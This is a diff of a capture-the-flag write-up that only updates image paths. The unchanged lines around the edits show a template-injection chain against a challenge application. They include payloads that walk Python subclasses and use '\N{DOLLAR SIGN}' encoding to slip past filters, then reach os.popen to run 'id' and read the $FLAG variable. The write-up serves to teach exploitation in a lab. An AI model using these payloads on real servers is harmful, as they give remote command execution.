@@ -170,12 +170,12 @@ To get the list of all classes, use the following payload :
 `${[].__class__.__base__.__subclasses__()}`
 Which give us once encoded properly to escape filters :
 `\N{DOLLAR SIGN}{[].__class__.__base__.__subclasses__()}` :
-![](img/ywh-5.png)
+![](dojo31/img/ywh-5.png)
 
 Once we have the list of classes, we can decode it using [cyberchief](https://cyberchef.org/#recipe=From_HTML_Entity()):
-![](img/ywh-6.png)
+![](dojo31/img/ywh-6.png)
 We can see find that the `Review` class is in the 2 index starting from the end. We can access it using the index `[-2]`. Once we have access to review class, we can access the reviews by calling the attribue `Review.reviews`. This will return the dict object created by the application, with our input inside :
-![](img/ywh-7.png)
+![](dojo31/img/ywh-7.png)
 But this is a dict object, so we need to transform it to a string. Fortunately, we can use the built-in method `__str__()`:
 `${[].__class__.__base__.__subclasses__()[-2].reviews.__str__()}`.
 And once we have a string object, we can extract any substring using python built-in slicing.
@@ -190,13 +190,13 @@ Which give us once encoded properly to escape filters :
 Will extract only the substring `id` from the review. We need to start 5 char from the end because the HTML escaped string create some characters at the end.
 
 The proof in action :
-![](img/ywh-8.png)
+![](dojo31/img/ywh-8.png)
 
 Now that it work, we can use this with the previous OS command injection to try to execute a command on the server. Will will use the following payload :
 `${cycler.__init__.__globals__.os.popen([].__class__.__base__.__subclasses__()[-2].reviews.__str__()[-7:-5]).read()}id`
 Which give us once encoded properly to escape filters :
 `\N{DOLLAR SIGN}{cycler.__init__.__globals__.os.popen([].__class__.__base__.__subclasses__()[-2].reviews.__str__()[-7:-5]).read()}id` :
-![](img/ywh-9.png)
+![](dojo31/img/ywh-9.png)
 And it work  ! We got a successful OS command injection on the server !
 ## PoC 
 
@@ -205,7 +205,7 @@ Using the following payload :
 \N{DOLLAR SIGN}{cycler.__init__.__globals__.os.popen([].__class__.__base__.__subclasses__()[-2].reviews.__str__()[-15:-5]).read()}echo \N{DOLLAR SIGN}FLAG
 ```
 We can dump the content of the env variable `$FLAG` :
-![](img/ywh-10.png)
+![](dojo31/img/ywh-10.png)
 `FLAG : FLAG{C0ff33_C0ff33_M0r3_C0ff33!!}`
 
 ## How to prevent
